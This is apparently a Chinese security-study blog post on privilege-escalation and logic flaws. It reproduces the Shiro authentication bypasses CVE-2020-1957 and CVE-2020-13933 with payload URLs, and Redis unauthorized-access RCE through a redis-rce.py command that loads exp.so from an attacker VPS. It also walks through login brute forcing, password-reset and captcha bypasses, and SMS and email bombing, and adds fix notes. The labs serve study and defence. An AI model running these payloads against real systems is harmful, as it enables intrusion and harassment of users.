    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>IE=edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>管理主页<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>管理主页<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="漏洞案例"><a href="#漏洞案例" class="headerlink" title="漏洞案例"></a>漏洞案例</h3><h4 id="Pikachu-Over-Permission"><a href="#Pikachu-Over-Permission" class="headerlink" title="Pikachu-Over Permission"></a>Pikachu-Over Permission</h4><p><strong>水平越权：</strong></p>
<ol>
<li>登录lili账号，查看基本信息，抓包</li>
</ol>
<p><img src="/2023/012220963/181.PNG" alt=" "></p>
<ol start="2">
<li>修改get传参的username中的参数(标识)，可以实现水平越权</li>
</ol>
<p><img src="/2023/012220963/182.PNG" alt=" "></p>
<p><strong>垂直越权：</strong></p>
<p><img src="/2023/012220963/183.PNG" alt=" "></p>
<p>使用普通用户的身份标识进行垂直越权时，身份标识要保持一直有效，同时抓包的数据包是被越权用户。</p>
<p><strong>获取垂直越权数据包：</strong></p>
<ol>
<li><p>猜测接口</p>
</li>
<li><p>通过前端的操作功能去抓包</p>
</li>
<li><p>代码审计（CMS、源码泄露）</p>
</li>
</ol>
<h4 id="CVE-2020-1957"><a href="#CVE-2020-1957" class="headerlink" title="CVE-2020-1957"></a>CVE-2020-1957</h4><p><strong>Shiro权限绕过（CVE-2020-1957）</strong></p>
<p>影响范围： <strong>Shiro 1.4.2 -&gt; 1.5.0版本</strong></p>
<p>Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。</p>
<p><strong>漏洞复现：</strong></p>
<p>环境：shiro 权限绕过（CVE-2020-1957）</p>
<p><img src="/2023/012220963/184.PNG" alt=" "></p>
<p>访问：/hello/123</p>
<p>提示需要登录</p>
<p>在末尾加个/再访问：/hello/123/</p>
<p>进入页面</p>
<p><strong>原理分析：</strong></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_22807425/article/details/108283839">https://blog.csdn.net/qq_22807425/article/details/108283839</a></p>
<p>Shiro使用正则进行路由匹配和拦截， /hello/* 下的路径全部需要进行认证</p>
<p><img src="/2023/012220963/185.PNG" alt=" "></p>
<p>如果我们访问 /hello/1 接口，会被authc拦截器拦截</p>
<p>但是我们访问 /hello/1/ 接口则不会被拦截</p>
<p><strong>漏洞修复：</strong>后续版本增加了/结尾的判断，通过判断requestURI是否以/为结尾，如果以/结尾的话，则去</p>
<p>掉尾部的/符号在与URL表达式进行比较。</p>
<h4 id="CNVD-2019-21763"><a href="#CNVD-2019-21763" class="headerlink" title="CNVD-2019-21763"></a>CNVD-2019-21763</h4><p><strong>Redis 未授权访问（CNVD-2019-21763）</strong></p>
<p>影响范围： <strong>Redis 2.x，3.x，4.x，5.x</strong></p>
<p>漏洞复现：</p>
<p>环境：vulfocus/redis-cnvd_2019_21763:latest</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">docker pull vulfocus&#x2F;redis-cnvd_2019_21763:latest
docker run -d -p 63790:6379 vulfocus&#x2F;redis-cnvd_2019_21763:latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>开启环境之后，在本机的63790端口映射出一个Redis服务</p>
<p>复现需要两个EXP</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
<p>将redis-rogue-server中的exp.so复制到redis-rce中</p>
<p>执行exp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">python3 redis<span class="token operator">-</span>rce<span class="token punctuation">.</span>py <span class="token operator">-</span>r 目标地址 <span class="token operator">-</span>p 目标端口 <span class="token operator">-</span>L vps地址 <span class="token operator">-</span>P vps端口 <span class="token operator">-</span>f exp<span class="token punctuation">.</span>so
<span class="token comment"># eg:</span>
python3 redis<span class="token operator">-</span>rce<span class="token punctuation">.</span>py <span class="token operator">-</span>r <span class="token number">193.168</span><span class="token number">.4</span><span class="token number">.75</span> <span class="token operator">-</span>p <span class="token number">63790</span> <span class="token operator">-</span>L <span class="token number">193.168</span><span class="token number">.4</span><span class="token number">.75</span> <span class="token operator">-</span>P <span class="token number">12345</span> <span class="token operator">-</span>f exp<span class="token punctuation">.</span>so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/012220963/186.PNG" alt=" "></p>
<h4 id="CVE-2020-13933"><a href="#CVE-2020-13933" class="headerlink" title="CVE-2020-13933"></a>CVE-2020-13933</h4><p><strong>Shiro身份验证绕过 （CVE-2020-13933）</strong></p>
<p>影响范围： <strong>Shiro &lt; 1.6.0</strong> <strong>版本</strong></p>
<p>漏洞复现：</p>
<p>环境：Shiro 身份验证绕过 （CVE-2020-13933）</p>
<p><img src="/2023/012220963/187.PNG" alt=" "></p>
<p><img src="/2023/012220963/188.PNG" alt=" "></p>
<p>访问身份验证页面</p>
<p><a href="http://ip:port/login">http://ip:port/login</a></p>
<p>通过特殊payload绕过权限</p>
<p><a href="http://ip:port/admin/%3bxxx">http://ip:port/admin/%3bxxx</a></p>
<p><strong>原理分析：</strong></p>
<p>Shiro源码</p>
<p>url：<a href="http://ip:port/read/%3bxxxx">http://ip:port/read/%3bxxxx</a></p>
<p>Shiro接收URL参数为：/read/;xxxx，这里shiro是对%3b做了解码处理</p>
<p><img src="/2023/012220963/189.PNG" alt=" "></p>
<p>接着调用removeSemicolon，该方法查找; 并将;及其之后的部分删除，最后再调用normalize</p>
<p><img src="/2023/012220963/191.PNG" alt=" "></p>
<p><img src="/2023/012220963/190.PNG" alt=" "></p>
<p>接着获取filterChains所对应的filter，将处理后的url进行匹配</p>
<p>匹配到xxxx后返回xxxx的页面</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45728976/article/details/108737882">https://blog.csdn.net/weixin_45728976/article/details/108737882</a></p>
<h4 id="身份认证漏洞实战"><a href="#身份认证漏洞实战" class="headerlink" title="身份认证漏洞实战"></a>身份认证漏洞实战</h4><p>环境：<a target="_blank" rel="noopener" href="https://www.mozhe.cn/bug/detail/eUM3SktudHdrUVh6eFloU0VERzB4Zz09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/eUM3SktudHdrUVh6eFloU0VERzB4Zz09bW96aGUmozhe</a></p>
<p><strong>漏洞复现：</strong></p>
<ol>
<li>登录平台</li>
</ol>
<p><img src="/2023/012220963/192.PNG" alt=" "></p>
<ol start="2">
<li>抓取数据包</li>
</ol>
<p>第一个包：</p>
<p><img src="/2023/012220963/193.PNG" alt=" "></p>
<p>之后点击forword放掉，截取第二个包</p>
<p><img src="/2023/012220963/194.PNG" alt=" "></p>
<ol start="3">
<li>进行暴力破解</li>
</ol>
<p><img src="/2023/012220963/195.PNG" alt=" "></p>
<p><img src="/2023/012220963/196.PNG" alt=" "></p>
<ol start="4">
<li>回到登录界面，查看源代码，查找马春生的身份标识</li>
</ol>
<p><img src="/2023/012220963/197.PNG" alt=" "></p>
<ol start="5">
<li>去爆破结果中找到相应信息</li>
</ol>
<p><img src="/2023/012220963/198.PNG" alt=" "></p>
<ol start="6">
<li>对密码解md5</li>
</ol>
<p><img src="/2023/012220963/199.PNG" alt=" "></p>
<ol start="8">
<li>登录</li>
</ol>
<p><img src="/2023/012220963/200.PNG" alt=" "></p>
<p>success!!!</p>
<h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>前端验证：传输加密</p>
<p>后端验证：永远不要相信用户的输入</p>
<h2 id="逻辑漏洞-找回漏洞及接口安全"><a href="#逻辑漏洞-找回漏洞及接口安全" class="headerlink" title="逻辑漏洞-找回漏洞及接口安全"></a>逻辑漏洞-找回漏洞及接口安全</h2><h3 id="找回漏洞"><a href="#找回漏洞" class="headerlink" title="找回漏洞"></a>找回漏洞</h3><h4 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h4><p><strong>找回密码机制：</strong></p>
<p>用户提交找回请求 -&gt; 服务器发送一个验证码 -&gt; 用户输入验证码 -&gt; 验证 -&gt; 重置信息</p>
<p><strong>绕过验证：</strong></p>
<ul>
<li><p>修改验证的状态码</p>
</li>
<li><p>验证码爆破（验证码长度较小、有效时间较长）</p>
</li>
<li><p>找回流程绕过（直接跳转到重置密码的页面）</p>
</li>
</ul>
<h4 id="找回流程绕过-验证码套用"><a href="#找回流程绕过-验证码套用" class="headerlink" title="找回流程绕过 验证码套用"></a>找回流程绕过 验证码套用</h4><p>环境：<a target="_blank" rel="noopener" href="https://www.mozhe.cn/bug/detail/K2sxTTVYaWNncUE1cTdyNXIyTklHdz09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/K2sxTTVYaWNncUE1cTdyNXIyTklHdz09bW96aGUmozhe</a></p>
<p>输入正确的手机号接收验证码后，将表单中的手机号改成被重置密码的手机号再点击提交，即可实现验</p>
<p>证码绕过。</p>
<p><img src="/2023/012220963/202.PNG" alt=" "></p>
<p><img src="/2023/012220963/201.PNG" alt=" "></p>
<h5 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h5><p>正常的找回密码逻辑：</p>
<ol>
<li><p> 第一个页面输入手机号获取验证码</p>
</li>
<li><p>验证成功后，在第二个页面重置密码</p>
</li>
</ol>
<p>例：<a target="_blank" rel="noopener" href="https://accounts.qq.com/find/password">https://accounts.qq.com/find/password</a></p>
<p>此环境的的逻辑：</p>
<p>接收验证码和重置密码在同一个页面中，导致逻辑被绕过</p>
<h4 id="验证码客户端回显"><a href="#验证码客户端回显" class="headerlink" title="验证码客户端回显"></a>验证码客户端回显</h4><p>一些网站为了开发方便，会在需要验证时，在客户端随机生成一个验证码，然后让服务端直接发送此随</p>
<p>机的验证码。</p>
<p>优点：验证时无需通过服务器，开发省事</p>
<p>缺点：黑客入侵也方便</p>
<h4 id="修改状态码绕过验证"><a href="#修改状态码绕过验证" class="headerlink" title="修改状态码绕过验证"></a>修改状态码绕过验证</h4><h5 id="抓Android数据包"><a href="#抓Android数据包" class="headerlink" title="抓Android数据包"></a>抓Android数据包</h5><ol>
<li>在电脑中安装 逍遥模拟器</li>
<li>在Burpsuit中添加代理地址</li>
</ol>
<p><img src="/2023/012220963/203.PNG" alt=" "></p>
<ol start="3">
<li>在模拟器中，找到网络设置，在wifi中手动配置代理</li>
</ol>
<p><img src="/2023/012220963/204.PNG" alt=" "></p>
<h5 id="修改验证状态码"><a href="#修改验证状态码" class="headerlink" title="修改验证状态码"></a>修改验证状态码</h5><p>一些客户端在校验验证码时，是以服务端发送的响应包中的状态码为准。</p>
<p>我们可以通过将错误的状态码修改成正确的状态码，来骗过客户端，从而达到绕过验证。</p>
<p><strong>案例演示：真实APP修改状态码绕过验证</strong></p>
<p><img src="/2023/012220963/205.PNG" alt=" "></p>
<h4 id="验证码爆破"><a href="#验证码爆破" class="headerlink" title="验证码爆破"></a>验证码爆破</h4><p>条件：</p>
<ul>
<li>验证码位数短</li>
<li>不同时包括数组和字母</li>
<li>验证码有效期长</li>
<li>没有输入错误的限制</li>
<li>无图片验证码</li>
</ul>
<h3 id="接口安全"><a href="#接口安全" class="headerlink" title="接口安全"></a>接口安全</h3><h4 id="邮件接口安全"><a href="#邮件接口安全" class="headerlink" title="邮件接口安全"></a>邮件接口安全</h4><p>原理：客户端调用需要发送验证码的接口是，接口没有做相关的验证</p>
<p>如： <a target="_blank" rel="noopener" href="http://example.com/getcode?email=13112345678@163.com">http://example.com/getcode?email=13112345678@163.com</a></p>
<p>更换接口中的邮件可实现向任意邮件发送验证码</p>
<p>配合自动化脚本，即可实现简易的 邮件轰炸</p>
<p><strong>了解原理即可，如需测试请使用自己的邮箱，注意点到为止！！</strong></p>
<p><strong>切勿用于邮件轰炸！！</strong></p>
<p><img src="/2023/012220963/206.PNG" alt=" "></p>
<p>修改邮箱和时间戳</p>
<p><img src="/2023/012220963/207.PNG" alt=" "></p>
<h4 id="短信接口安全"><a href="#短信接口安全" class="headerlink" title="短信接口安全"></a>短信接口安全</h4><p>原理：客户端调用需要发送验证码的接口是，接口没有做相关的验证</p>
<p>如： <a target="_blank" rel="noopener" href="http://example.com/getcode?phone=13112345678">http://example.com/getcode?phone=13112345678</a></p>
<p>更换接口中的手机号可实现向任意手机发送短信验证码</p>
<p>配合自动化脚本，即可实现简易的 短信轰炸</p>
<p><strong>了解原理即可，如需测试请使用自己的手机号，注意点到为止！！</strong></p>
<p><strong>切勿用于短信轰炸！！</strong></p>
<h4 id="语音接口安全"><a href="#语音接口安全" class="headerlink" title="语音接口安全"></a>语音接口安全</h4>
                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">wwq</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://wwqstudy.github.io/2023/012220963.html">http://wwqstudy.github.io/2023/012220963.html</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">wwq</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            <span class="chip bg-color">无标签</span>
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2023/032462972.html">
                    <div class="card-image">
                        
                        
                        <img src="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/medias/featureimages/20.jpg" class="responsive-img" alt="网络攻击与防范">
                        
                        <span class="card-title">网络攻击与防范</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2023-03-24
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            wwq
                            
                        </span>
                    </div>
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2022/10208472.html">
                    <div class="card-image">
                        
                        
                        <img src="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/medias/featureimages/1.jpg" class="responsive-img" alt="云原生网路全景安全数据采集与智能分析">
                        
                        <span class="card-title">云原生网路全景安全数据采集与智能分析</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2022-10-20
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            wwq
                            
                        </span>
                    </div>
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/libs/aplayer/APlayer.min.js"></script>
<script src="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/libs/aplayer/Meting.min.js"></script>

    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2023</span>
            
            <a href="/about" target="_blank">wwq</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/wwqstudy" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:1457060849@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1457060849" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1457060849" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/libs/materialize/materialize.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/libs/aos/aos.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/js/matery.js"></script>

    

    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/libs/instantpage/instantpage.js" type="module"></script>
    

